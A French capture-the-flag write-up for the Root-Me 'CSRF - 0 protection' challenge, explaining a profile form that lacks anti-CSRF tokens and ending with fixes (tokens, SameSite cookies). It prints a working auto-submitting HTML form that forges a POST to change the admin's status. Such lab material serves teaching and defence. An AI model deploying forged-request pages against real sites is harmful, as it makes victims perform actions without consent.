# CSRF - 0 protection

## Infos

- Catégorie : Web - Client
- Difficulté / Points :
- Fichiers / URL fournis : http://challenge01.root-me.org/web-client/ch22/

## Énoncé

*(à compléter)*

> Challenge réalisé au terminal (Linux) : les étapes sont retranscrites en commandes, il n'y a donc pas de captures d'écran.

## TL;DR

Le formulaire qui change le profil n'a aucune protection CSRF (pas de token). On peut donc héberger une page qui envoie la requête à la place de la victime : dès qu'elle l'ouvre, son profil est modifié sans qu'elle le veuille. C'est une **CSRF** (*Cross-Site Request Forgery*).

## Reconnaissance

Le challenge a une action qui modifie le profil via une requête `POST` (champs `username` et `status`). Aucun token anti-CSRF n'accompagne la requête : rien ne vérifie que c'est bien l'utilisateur qui a déclenché l'action depuis le site.

## Exploitation

Je crée une page HTML qui contient le même formulaire, pré-rempli, et qui l'envoie automatiquement au chargement avec un petit script :

```html
<form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
      method="post" enctype="multipart/form-data">
  <input type="hidden" name="username" value="test">
  <input type="hidden" name="status" value="on">
</form>
<script>document.forms[0].submit();</script>
```

Quand la victime (ici l'admin du challenge) ouvre cette page, son navigateur envoie la requête avec ses propres cookies, et le `status` est modifié.

## Flag

`masqué` *(règles Root-Me)*

## Ce que j'ai appris

- Une CSRF exploite le fait que le navigateur envoie automatiquement les cookies de la victime avec la requête.
- Il n'y a pas besoin de voler le cookie : on fait juste exécuter une action à la victime à son insu.
- Pour corriger : ajouter un **token CSRF** unique dans chaque formulaire, et utiliser l'attribut `SameSite` sur les cookies de session.
